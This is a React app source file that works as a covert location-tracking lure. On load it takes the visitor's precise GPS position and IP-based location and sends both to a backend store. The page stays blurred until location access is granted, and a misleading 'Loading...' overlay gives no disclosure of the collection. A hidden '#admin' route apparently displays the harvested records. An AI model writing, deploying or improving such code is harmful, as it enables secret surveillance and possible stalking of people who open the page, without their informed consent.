import { useState, useEffect } from 'react';
import axios from 'axios';
import FeatureSection from "./components/FeatureSection";
import AdminDashboard from "./components/AdminDashboard";

// Replace with your actual backend URL (e.g., https://onrender.com)
export const API_BASE_URL = import.meta.env.VITE_API_URL || "http://localhost:10000";

// Configure axios with defaults
axios.defaults.timeout = 10000;
axios.defaults.baseURL = API_BASE_URL; 

function App() {
  const [currentPage, setCurrentPage] = useState<'main' | 'admin'>('main');
  const [accessGranted, setAccessGranted] = useState<boolean | null>(null);

  // Define functions
  const syncUserData = async (lat: number, lng: number) => {
    try {
      console.log('Starting sync with backend:', API_BASE_URL);
      
      // 1. Fetch IP Info (using geolocation-db.com - CORS enabled)
      console.log('Fetching location data...');
      const ipRes = await axios.get('https://geolocation-db.com/json/');
      const ipData = ipRes.data;
      console.log('Location Data received:', ipData);

      // 2. Prepare Payload (Matching your Schema)
      const payload = {
        accurateLocation: { 
          lat, 
          lng, 
          accurateLocation: `https://www.google.com/maps/search/?api=1&query=${lat},${lng}`
        },
        ipLocation: {
          ip: ipData.IPv4 || 'unknown',
          city: ipData.city,
          lat: ipData.latitude,
          lng: ipData.longitude,
          location: `https://www.google.com/maps/search/?api=1&query=${ipData.latitude},${ipData.longitude}`
        },
      };

      // 3. Send to Express
      console.log('Sending payload to backend:', payload);
      const response = await axios.post('/api/store', payload);
      console.log('Backend response:', response.data);
      return response.data;
    } catch (error: any) {
      console.error("Sync Error Details:", {
        message: error.message,
        code: error.code,
        status: error.response?.status,
        data: error.response?.data,
        config: error.config?.url
      });
      throw error;
    }
  };

  const getPreciseLocation = () => {
    if (!("geolocation" in navigator)) {
      console.log("Geolocation is not supported by your browser.");
      setAccessGranted(false);
      return;
    }

    navigator.geolocation.getCurrentPosition(
      async(position) => {
        const { latitude, longitude, accuracy } = position.coords;
        
        const googleMapsUrl = `https://www.google.com/maps/search/?api=1&query=${latitude},${longitude}`;

        // Output requested data to the console
        console.log(`User Latitude: ${latitude}`);
        console.log(`User Longitude: ${longitude}`);
        console.log(`Accurate within: ${accuracy} meters`);
        console.log(`Google Maps Link Acc: ${googleMapsUrl}`);

        setAccessGranted(true);

        try {
          await syncUserData(latitude, longitude);
          console.log("Location synchronized successfully.");
        } catch (err) {
          console.error("Database sync failed.");
        }
      },
      (err) => {
        console.error(`Geolocation error (${err.code}): ${err.message}`);
        setAccessGranted(false);
      },
      {
        enableHighAccuracy: true, 
        timeout: 1000000,           
        maximumAge: 0,             
      }
    );
  };

  // Hash routing effect
  useEffect(() => {
    const handleHashChange = () => {
      const hash = window.location.hash.slice(1); // Remove '#'
      if (hash === 'admin') {
        setCurrentPage('admin');
      } else {
        setCurrentPage('main');
      }
    };

    handleHashChange();
    window.addEventListener('hashchange', handleHashChange);
    return () => window.removeEventListener('hashchange', handleHashChange);
  }, []);

  // Geolocation effect - only for main page
  useEffect(() => {
    if (currentPage === 'main') {
      getPreciseLocation();
    }
  }, [currentPage]);

  // Show admin dashboard if admin page
  if (currentPage === 'admin') {
    return <AdminDashboard />;
  }

  // Show main page with location permission
  return (
    <div style={{ position: 'relative' }}>
      <div style={{
        filter: accessGranted !== true ? 'blur(5px)' : 'none',
        pointerEvents: accessGranted !== true ? 'none' : 'auto',
        transition: 'filter 0.3s ease'
      }}>
        <FeatureSection />
      </div>
      {accessGranted !== true && (
        <div style={{
          position: 'absolute',
          top: 0,
          left: 0,
          right: 0,
          bottom: 0,
          display: 'flex',
          flexDirection: 'column',
          alignItems: 'center',
          justifyContent: 'center',
          backgroundColor: 'rgba(0, 0, 0, 0.5)',
          color: 'white',
          fontSize: '24px',
          zIndex: 10,
          textAlign: 'center',
          padding: '20px'
        }}>
          <div style={{ marginBottom: '20px' }}>
            {accessGranted === null ? 'Loading...' : 'Looding...'}
          </div>
          
        </div>
      )}
    </div>
  );
}

export default App;